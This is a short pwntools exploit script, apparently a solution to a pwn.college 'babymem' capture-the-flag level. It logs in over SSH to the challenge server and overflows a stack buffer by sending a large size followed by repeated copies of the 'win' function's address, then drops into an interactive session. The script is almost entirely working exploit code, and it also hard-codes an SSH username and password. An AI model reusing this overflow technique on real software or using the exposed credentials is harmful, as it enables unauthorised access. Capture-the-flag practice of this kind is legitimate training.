from pwn import *

e = ELF('./babymem_level3_testing1')
# libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")
p = s.run('/babymem_level3_testing1')

p.sendline(str(0x1000))
p.send(p64(e.symbols['win'])*0x200)

p.interactive()